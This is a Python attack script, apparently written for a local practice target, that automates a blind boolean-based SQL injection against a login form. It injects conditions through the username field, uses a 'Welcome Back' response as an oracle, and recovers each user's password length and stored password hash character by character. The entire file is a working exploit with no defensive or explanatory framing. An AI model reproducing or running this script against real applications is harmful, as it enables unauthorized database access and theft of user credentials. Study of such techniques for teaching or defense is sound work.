import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome Back"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": 'admin\' and {}--"'.format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id={} {} hex('{}') limit 1)".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id):
    payload = "(select id from user where id={} >= 0 limit 1)".format(user_id)
    return not injected_query(payload)

def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from user where id={} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(password_length):
        for char in charset:
            if boolean_query(i, user_id, char):
                found += char
                break
    return found

def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries".format(total_queries))
    total_queries = 0

while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash:")
        user_id = int(user_id)  # Convert input to integer
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            hashed_password = extract_hash(charset, user_id, user_password_length)
            print("\t[-] User {} hashed password: {}".format(user_id, hashed_password))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
    except ValueError:
        print("\t[X] Please enter a valid user ID.")
